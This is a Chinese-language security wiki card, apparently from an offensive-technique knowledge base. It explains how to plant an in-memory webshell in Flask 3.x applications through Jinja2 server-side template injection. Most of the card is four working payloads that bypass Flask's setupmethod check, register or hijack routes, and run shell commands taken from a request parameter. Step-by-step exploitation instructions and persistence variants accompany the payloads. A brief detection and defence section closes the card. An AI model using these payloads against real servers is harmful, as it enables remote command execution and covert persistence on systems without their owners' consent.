---
id: web-python-framework-flask-route-registration-memshell
title: Flask 高版本路由注册内存马：重置 _got_first_request 绕过 @setupmethod 动态加路由
type: scenario
domain: web
path: web/python/framework
technique: flask-route-registration-memshell
tags:
- web
- python
- flask
- ssti
- memshell
- persistence
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V21
  verified_at: '2026-11-05T02:33:21+08:00'
  notes: 已对照原文核对：文中@setupmethod/_got_first_request原理与图无（原文无图）一致；四类PoC（@app.get重置标志、add_url_rule、url_map.add+view_functions、覆盖已有view_functions）逐字对应原文。未验证点：原文未给实测响应截图，我未本机复跑；Flask 3.x版本行为（2.3+引入setupmethod）依环境；frontmatter无sources/source_url；affected_versions原文未标注。
url: /docs/web/python/framework/web-python-framework-flask-route-registration-memshell/
draft: false
kb_aliases:
- Flask 路由内存马
- view_functions 注入
- url_map.add 内存马
- _got_first_request 绕过
- setupmethod 绕过
- add_url_rule 运行期注册
- endpoint 装饰器后门
---

## 一句话结论

拿到 Flask 应用内的 `exec` 后，在 Flask 3.x 中可以先把 `app._got_first_request` 重置为 `False`，再通过 `@app.route`/`add_url_rule`/`@app.endpoint` 动态注册命令执行路由；或者完全绕开高层 API，直接 `app.url_map.add(app.url_rule_class(...))` 并向 `app.view_functions` 写入 lambda，甚至直接覆盖已有视图函数，从而在进程内存中留下一个不落盘的 webshell。

## 原理

- Flask 3.x 给 `add_url_rule`、`route`、`endpoint`、`before_request` 等注册方法加了 `@setupmethod` 装饰器，内部调用 `app._check_setup_finished`。首次请求处理过后 `app._got_first_request` 为 `True`，再调用这些方法会抛 `AssertionError: The setup method ... can no longer be called`。
- 该检查只读取实例属性 `_got_first_request`，把它改回 `False` 后，`@setupmethod` 的保护即失效，运行期又能正常注册路由。
- 更隐蔽的路径是跳过 `add_url_rule`：Flask 内部最终也只是把 `Rule` 对象加入 `app.url_map`，并把 endpoint 对应的函数写进 `app.view_functions`。直接执行 `app.url_map.add(app.url_rule_class('/shell', methods=['GET'], endpoint='shell'))` 与 `app.view_functions.update({'shell': lambda: ...})` 不经过 `@setupmethod`，因此连 `_got_first_request` 都不用改。
- 已有路由的 endpoint 也可以被直接替换：`app.view_functions['index'] = lambda: ...`，这样 `url_map` 不变，只把处理函数换成恶意逻辑，静态检查路由表时更难发现。
- 所有改动只存在于当前 Python 进程；应用重启即失效，属于典型内存马/进程内持久化后门。

## 触发条件

- 存在 Jinja2 SSTI（如 `render_template_string` 拼接用户输入）或任意 `eval`/`exec` 注入点，且能取到 `current_app`（常用 `url_for.__globals__['current_app']`）。
- Flask 版本为 2.3+/3.x（带 `@setupmethod` 与 `_got_first_request` 检查）；更老版本可直接调用注册方法。
- 进程不重启；攻击者能访问新注册的路由（或触发被覆盖的已有路由）。
- 若走 `_got_first_request=False` 路径，需要能对 `app` 实例属性赋值；若走 `url_map.add` 路径，需要能访问 `app.url_map`、`app.url_rule_class`、`app.view_functions`。

## 利用步骤

1. 通过 SSTI 取得 `exec` 与 `app`：

```jinja
{{lipsum.__globals__['__builtins__']['exec']("...", {'app': url_for.__globals__['current_app']})}}
```

2. 选择注册方式：
   - 重置标志后用装饰器：`app._got_first_request=False` + `@app.get('/dd')`；
   - 重置标志后用 `add_url_rule('/ss','cmd',cmd)`；
   - 直接操作 `url_map` + `view_functions`（无需重置标志）；
   - 覆盖已有 endpoint 的 `view_functions`。
3. 访问 `/dd?cmd=id` 等路径，确认命令执行回显。
4. 清理时删除对应 `url_map` 规则与 `view_functions` 键，或直接重启进程。

## PoC

方式一：重置 `_got_first_request` 后用 `@app.get` 装饰器（`exec` 的 globals 传入 `app`）：

```jinja
{{lipsum.__globals__['__builtins__']['exec'](
  'app._got_first_request=False\n'
  '@app.get("/dd")\n'
  'def cmd():\n'
  '    return __import__("os").popen(__import__("flask").request.args.get("cmd")).read()',
  {'app': url_for.__globals__['current_app']}
)}}
```

方式二：`add_url_rule`：

```jinja
{{lipsum.__globals__['__builtins__']['exec'](
  'app._got_first_request=False\n'
  'def cmd():\n'
  '    return __import__("os").popen(__import__("flask").request.args.get("cmd")).read()\n'
  'app.add_url_rule("/ss", "cmd", cmd)',
  {'app': url_for.__globals__['current_app']}
)}}
```

方式三：直接操作内部注册表（不触发 `@setupmethod`）：

```jinja
{{url_for.__globals__['__builtins__']['exec'](
  "app.url_map.add(app.url_rule_class('/shell', methods=['GET'], endpoint='shell'));"
  "app.view_functions.update({'shell': lambda: __import__('os').popen(__import__('flask').request.args.get('cmd')).read()})",
  {'app': url_for.__globals__['current_app']}
)}}
```

方式四：劫持已有视图函数（以 `index` 为例）：

```jinja
{{url_for.__globals__['__builtins__']['exec'](
  "app.view_functions['index'] = lambda: __import__('os').popen(__import__('flask').request.args.get('cmd')).read()",
  {'app': url_for.__globals__['current_app']}
)}}
```

`@app.endpoint('shell')` 同样受 `@setupmethod` 保护，需要先 `app._got_first_request=False`；底层还有 `_method_route("PATCH", rule, options)` 等内部方法可注册特定 HTTP 方法。

## 变体与关联

- 变体：`app.add_url_rule` 的 `view_func` 可用 lambda；`url_map.add` 与 `view_functions` 也可分两步写。
- 变体：覆盖 `app.view_functions['static']` 或 404 处理函数，可让正常路由携带后门。
- 关联卡片：[[web-python-framework-flask-hook-registry-memshell]]（before/after 注册表型）、[[web-python-framework-flask-method-override-component-memshell]]（方法覆盖与 jinja_env 型）。
- 边界：`_got_first_request` 是实例属性，修改只影响当前进程；若应用启用了多 worker（gunicorn 多进程），每个 worker 需分别注入，或改走可序列化的入口。
- 错误处理器：`@app.errorhandler`/`register_error_handler` 也受 `@setupmethod` 保护，理论上同样可重置标志后注册；但直接改写 `app.error_handler_spec` 字典在 Flask 3.1 的实测中存在不生效的情况，使用前需按目标版本验证，不要假设一定成功。

## 检测与防御

- 检测：遍历 `app.view_functions`，关注匿名 lambda、函数源码为空/来自 `exec`、`__module__` 异常的值；比对 `app.url_map` 中不存在于源码/启动日志的路由；对 `index` 等已有 endpoint 的处理函数做基线哈希。
- 运行时：监控 `_got_first_request` 被改回 `False`、`url_map.add`/`view_functions` 在首个请求后被写入的行为；记录 `cmd`/`code` 等参数的高频访问。
- 防御：阻止 SSTI 与任意 `exec`/`eval`（这是前置条件）；生产环境限制模板拼接；进程被植入后最可靠的清理是重启并轮换密钥，单删路由可能遗漏其他注册点。
